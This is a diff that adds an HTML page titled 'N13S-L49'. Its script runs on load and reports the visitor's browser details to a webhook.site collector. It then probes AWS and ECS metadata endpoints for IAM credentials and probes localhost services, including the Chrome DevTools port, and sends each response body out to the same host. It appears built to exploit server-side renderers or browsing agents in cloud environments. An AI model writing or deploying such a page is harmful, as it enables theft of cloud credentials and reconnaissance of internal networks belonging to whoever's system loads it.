@@ -1,0 +1,45 @@
+<!doctype html><html><head><meta charset="utf-8"><title>N13S-L49</title>
+<style>body{font:28px/1.1 monospace;margin:0}#o{white-space:pre-wrap;word-break:break-all}</style>
+</head><body><div id="o">N13S-L49 BOOT
+</div>
+<script>
+var S="https://webhook.site/54290539-8042-4b00-a97f-cb5d31be09fb/";
+var o=document.getElementById("o");
+function say(t){o.textContent+=t+"\n";}
+function beacon(tag,d){
+  d=String(d).slice(0,1400);
+  try{var i=new Image();i.src=S+tag+"?d="+encodeURIComponent(d);}catch(e){}
+  try{navigator.sendBeacon(S+tag,d);}catch(e){}
+}
+beacon("alive",navigator.userAgent+" || href="+location.href+" || ref="+document.referrer+" || ua-data="+(navigator.userAgentData?JSON.stringify(navigator.userAgentData):"-"));
+say("UA "+navigator.userAgent.slice(0,60));
+var T=[
+ ["imds_root","http://169.254.169.254/latest/meta-data/"],
+ ["imds_iam","http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
+ ["imds_id","http://169.254.169.254/latest/dynamic/instance-identity/document"],
+ ["ecs_meta","http://169.254.170.2/v2/metadata"],
+ ["ecs_cred","http://169.254.170.2/v2/credentials"],
+ ["lo_80","http://127.0.0.1/"],
+ ["lo_9222","http://127.0.0.1:9222/json/version"],
+ ["lh_9222","http://localhost:9222/json/version"]
+];
+function probe(n,u,mode){
+  var t0=Date.now();
+  return fetch(u,{mode:mode,cache:"no-store"}).then(function(r){
+    return r.text().catch(function(e){return "<unreadable:"+e+">";}).then(function(b){
+      var m=n+"/"+mode+" OK st="+r.status+" type="+r.type+" ms="+(Date.now()-t0)+" body="+b.slice(0,1000);
+      beacon("p",m);say(m.slice(0,120));
+    });
+  }).catch(function(e){
+    var m=n+"/"+mode+" ERR "+e+" ms="+(Date.now()-t0);
+    beacon("p",m);say(m.slice(0,120));
+  });
+}
+T.forEach(function(t){var i=new Image();i.src=t[1];i.onload=function(){beacon("img",t[0]+" ONLOAD");};i.onerror=function(){beacon("img",t[0]+" ONERROR");};});
+var chain=Promise.resolve();
+T.forEach(function(t){
+  chain=chain.then(function(){return probe(t[0],t[1],"cors");})
+             .then(function(){return probe(t[0],t[1],"no-cors");});
+});
+chain.then(function(){beacon("done","all");say("DONE");});
+</script></body></html>
